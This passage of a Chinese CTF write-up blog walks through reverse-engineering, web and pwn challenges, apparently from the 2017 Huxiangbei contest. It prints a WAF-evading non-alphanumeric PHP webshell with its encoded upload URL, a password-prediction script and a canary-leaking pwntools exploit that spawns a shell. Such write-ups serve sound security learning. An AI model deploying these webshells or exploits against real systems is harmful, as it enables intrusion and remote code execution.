class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h1 id="RE200-简单的-android"><a href="#RE200-简单的-android" class="headerlink" title="RE200 简单的 android"></a>RE200 简单的 android</h1><p>将apk格式改成zip解压出来</p><p>使用d2x2jar反汇编拿到源码</p><p><img src="android.png" alt></p><p>使用工具jd-gui查看源码</p><p><img src="android_flag.png" alt></p><p>直接拿到flag。</p><h1 id="RE400pyc-分析"><a href="#RE400pyc-分析" class="headerlink" title="RE400pyc 分析"></a>RE400pyc 分析</h1><p><a href="https://www.anquanke.com/post/id/82649" target="_blank" rel="noopener">XDCTF 原题</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">def tobin(b):</span><br><span class="line">    ret=<span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> [128,64,32,16,8,4,2,1]:</span><br><span class="line">    ret+=<span class="string">'1'</span> <span class="keyword">if</span> b&amp;i <span class="keyword">else</span> <span class="string">'0'</span></span><br><span class="line">    <span class="built_in">return</span> ret</span><br><span class="line">def decode3b(s):</span><br><span class="line">    a=s&gt;&gt;16</span><br><span class="line">    b=(s&gt;&gt;8) &amp; 0xFF</span><br><span class="line">    c=s &amp; 0xff</span><br><span class="line">    sa=tobin(a)</span><br><span class="line">    sb=tobin(b)</span><br><span class="line">    sc=tobin(c)</span><br><span class="line">    <span class="built_in">return</span> table[int(sa[2:],2)]+table[int(sb[4:]+sa[:2],2)]+table[int(sc[6:]+sb[:4],2)]+table[int(sc[:6],2)]</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&gt;&gt;&gt; a=open(<span class="string">'flag.enc'</span>,<span class="string">'rb'</span>)</span><br><span class="line">&gt;&gt;&gt; a=a.read()</span><br><span class="line">&gt;&gt;&gt; s=<span class="string">''</span></span><br><span class="line">&gt;&gt;&gt; <span class="keyword">for</span> i <span class="keyword">in</span> xrange(0, len(a), 3):</span><br><span class="line">...     s+=decode3b(int(a[i:i+3].encode(<span class="string">'hex'</span>), 16))</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; s</span><br><span class="line"><span class="string">'yedugr1ofbm2o4epQz8i1op2tpkxft1nf344t000000000000000'</span></span><br><span class="line">&gt;&gt;&gt; s=<span class="string">''</span>.join(map(lambda c: table[(table.index(c)+63)%64], s))</span><br><span class="line"><span class="string">'xdctfq0neal1n3doPy7h0no1sojwes0me233s"""""""""""""""'</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">xdctf&#123;0ne-l1n3d_Py7h0n_1s_@wes0me233&#125;</span><br></pre></td></tr></table></figure><h1 id="Web150-random"><a href="#Web150-random" class="headerlink" title="Web150 random"></a>Web150 random</h1><p>访问 .index.php.swp 得到源码。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">"*********************"</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"please input a rand_num !"</span>;</span><br><span class="line"><span class="keyword">function</span> create_password(<span class="variable">$pw_length</span> =  10)&#123;</span><br><span class="line">    <span class="variable">$randpwd</span> = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = 0; <span class="variable">$i</span> &lt; <span class="variable">$pw_length</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="variable">$randpwd</span> .= chr(mt_rand(100, 200));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">return</span> <span class="variable">$randpwd</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">mt_srand(time());</span><br><span class="line"></span><br><span class="line"><span class="variable">$pwd</span>=create_password();</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$pwd</span>.<span class="string">'||'</span>;    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$pwd</span> == <span class="variable">$_GET</span>[<span class="string">'pwd'</span>])&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"first"</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">'userLogin'</span>]==<span class="variable">$_GET</span>[<span class="string">'login'</span>])</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"Nice , you get the flag it is "</span>.<span class="variable">$flag</span> ;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"Wrong!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">'userLogin'</span>]=create_password(32).rand();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>是按照时间戳那生成的密码，所以快速的再提交一边密码就好了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line">import sys</span><br><span class="line">import urllib</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">"utf-8"</span>)</span><br><span class="line">import requests</span><br><span class="line"><span class="built_in">pwd</span> = requests.get(<span class="string">'http://114.215.138.89:10080'</span>).content[-18:-8]</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">pwd</span></span><br><span class="line">ans1 =  requests.get(<span class="string">'http://114.215.138.89:10080?pwd='</span>+urllib.quote(<span class="built_in">pwd</span>)).content</span><br><span class="line"><span class="built_in">print</span> ans1</span><br></pre></td></tr></table></figure><p><img src="web-150.png" alt></p><h1 id="Web200"><a href="#Web200" class="headerlink" title="Web200"></a>Web200</h1><p>简简单单的上传，没有套路。</p><p>文件包含漏洞，直接使用 php://filter 读取 flag.php 即可获得 Base64 编码过后的 flag</p><p><img src="web-200.png" alt></p><p>base64解码得到 flag。</p><p>$flag=”flag{c420fb4054e91944a71ff68f7079b9424e5cba21}”; </p><h1 id="Web300"><a href="#Web300" class="headerlink" title="Web300"></a>Web300</h1><p>过滤了字母、数字和一些符号，需要上传一个 webshell</p><p>找到 <a href="https://www.leavesongs.com/penetration/webshell-without-alphanum.html" target="_blank" rel="noopener">p 牛的文章</a>，提到了一种利用类型转换的 webshell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$_</span>=[];</span><br><span class="line"><span class="variable">$_</span>=@<span class="string">"<span class="variable">$_</span>"</span>; // <span class="variable">$_</span>=<span class="string">'Array'</span>;</span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">'!'</span>==<span class="string">'@'</span>]; // <span class="variable">$_</span>=<span class="variable">$_</span>[0];</span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$_</span>; // A</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>; // S</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>; // S</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // E </span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // R</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // T</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$____</span>=<span class="string">'_'</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // P</span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // O</span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // S</span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // T</span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=$<span class="variable">$____</span>;</span><br><span class="line"><span class="variable">$___</span>(<span class="variable">$_</span>[_]); // ASSERT(<span class="variable">$_POST</span>[_]);</span><br></pre></td></tr></table></figure><p>根据本题的 waf，还是需要绕过一下，@ 用来屏蔽错误，可以去掉，不影响功能。<br>用来获取 Array 字符串的双引号可以采用 $_=’’.[]; 来绕过。</p><p>最后可以绕过本题 waf 的 webshell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php <span class="variable">$_</span>=<span class="string">''</span>.[];<span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">'_'</span>==<span class="string">'__'</span>];<span class="variable">$___</span>=<span class="variable">$_</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$____</span>=<span class="string">'_'</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$_</span>=$<span class="variable">$____</span>;<span class="variable">$___</span>(<span class="variable">$_</span>[_]);</span><br></pre></td></tr></table></figure><p>编码后即可成功上传 webshell</p><p>最终 payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://114.215.133.202:10080/index.php?content=%24_%3D%27%27.%5B%5D%3B%24_%3D%24_%5B%27_%27%3D%3D%27__%27%5D%3B%24___%3D%24_%3B%24__%3D%24_%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24___.%3D%24__%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24___.%3D%24__%3B%24____%3D%27_%27%3B%24__%3D%24_%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24____.%3D%24__%3B%24_%3D%24%24____%3B%24___%28%24_%5B_%5D%29%3B</span><br><span class="line"></span><br><span class="line">&lt;?php <span class="variable">$flag</span>=<span class="string">"=hxb2017&#123;51f759f39ac1f0cd5509b299b1d908f7&#125;"</span>; ?&gt;</span><br></pre></td></tr></table></figure><h1 id="PWN100"><a href="#PWN100" class="headerlink" title="PWN100"></a>PWN100</h1><p>把 pwns100 直接拖入 ida 中：<br>main函数：</p><p><img src="pwn100_1.png" alt></p><p>base64 解码函数</p><p><img src="pwn100_2.png" alt></p><p>输入函数</p><p><img src="pwn100_3.png" alt></p><p>可以看到 read 可以输入的字符串可以长达 0x200 个，这里可造成缓冲区溢出漏洞<br>这个程序很简单，输入 base64 字符串输出 base64 解码之后的字符串<br>先运行一下程序看一下这个程序干了啥：</p><p><img src="pwn100_4.png" alt></p><p>再看看程序开启了哪些保护：</p><p><img src="pwn100_5.png" alt></p><p>因为这个程序开了 Canary，这个题目的要利用 printf 泄露这个程序中的 Canary，然后再泄露 libc 的基地址，最后利用溢出重新布置栈空间 getshell。<br>因为每次 fork,子进程复制父进程的数据空间(数据段)、栈和堆，父、子进程共享正文段。也就是说，对于程序中的数据，子进程要复制一份，但是对于指令，子进程并不复制而是和父进程共享，具体可参考<a href="https://www.cnblogs.com/bwangel23/p/4190043.html" target="_blank" rel="noopener">https://www.cnblogs.com/bwangel23/p/4190043.html</a> 这个文章，所以虽然在泄露 Canary 或者 libc 的时候使子进程崩溃了，但是不会影响父进程的稳定性。<br>所以我的 exp 是：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">__Auther__ = <span class="string">'niexinming'</span></span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">import base64</span><br><span class="line">context(terminal = [<span class="string">'gnome-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'sh'</span>, <span class="string">'-c'</span>], arch = <span class="string">'i386'</span>, os = <span class="string">'linux'</span>, log_level = <span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">def debug(addr = <span class="string">'0x08048B09'</span>):</span><br><span class="line">    raw_input(<span class="string">'debug:'</span>)</span><br><span class="line">    gdb.attach(io, <span class="string">"b *"</span> + addr)</span><br><span class="line"></span><br><span class="line">local_MAGIC = 0x0003AC69</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">'/home/h11p/hackme/huxiangbei/pwns'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = remote('104.224.169.128', 18887)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#getCanary</span></span><br><span class="line">payload = <span class="string">'a'</span>*0x102</span><br><span class="line">io.recvuntil(<span class="string">'May be I can know if you give me some data[Y/N]\n'</span>)</span><br><span class="line">io.sendline(<span class="string">'Y'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'Give me some datas:\n'</span>)</span><br><span class="line">io.send(base64.b64encode(payload))</span><br><span class="line">io.recvline()</span><br><span class="line">myCanary=io.recv()[268:271]</span><br><span class="line">Canary=<span class="string">"\x00"</span>+myCanary</span><br><span class="line"><span class="built_in">print</span> <span class="string">"Canary:"</span>+hex(u32(Canary))</span><br><span class="line"></span><br><span class="line"><span class="comment">#getlibc</span></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">payload = <span class="string">'a'</span>*0x151</span><br><span class="line">io.recvuntil(<span class="string">'May be I can know if you give me some data[Y/N]\n'</span>)</span><br><span class="line">io.sendline(<span class="string">'Y'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'Give me some datas:\n'</span>)</span><br><span class="line">io.send(base64.b64encode(payload))</span><br><span class="line">io.recvline()</span><br><span class="line">mylibc=io.recv()[347:351]</span><br><span class="line">base_libc=u32(mylibc)-0x18637</span><br><span class="line"><span class="built_in">print</span> <span class="string">"mylibc_addr:"</span>+hex(base_libc)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pwn</span></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">MAGIC_addr=local_MAGIC+base_libc</span><br><span class="line">payload = <span class="string">'a'</span>*0x101+Canary+<span class="string">"a"</span>*0xc+p32(MAGIC_addr)</span><br><span class="line">io.recvuntil(<span class="string">'May be I can know if you give me some data[Y/N]\n'</span>)</span><br><span class="line">io.sendline(<span class="string">'Y'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'Give me some datas:\n'</span>)</span><br><span class="line">io.send(base64.b64encode(payload))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line">io.close()</span><br></pre></td></tr></table></figure><p>讲解一下如何获取 Canary，因为输入的输入数据会被 printf 输出，遇到 0x00 的时候停止输出，如果输入的输入刚刚好覆盖到 Canary 前面就可以用 printf 输出 Canary 了，但是 Canary 后两位是 0x00,所以得到输出之后要补足后两位的 0x00</p><p><img src="pwn100_6.png" alt></p><p>同理也可以用这种方法计算出__libc_start_main 和 libc 的基地址</p><p><img src="pwn100_7.png" alt></p><p>计算出 Canary 的值和基地址后，就可以通过溢出让程序程序跳转到 MAGIC 去了，就可以 getshell 了，至于 MAGIC 是啥，大家可以翻一下这篇文章：<a 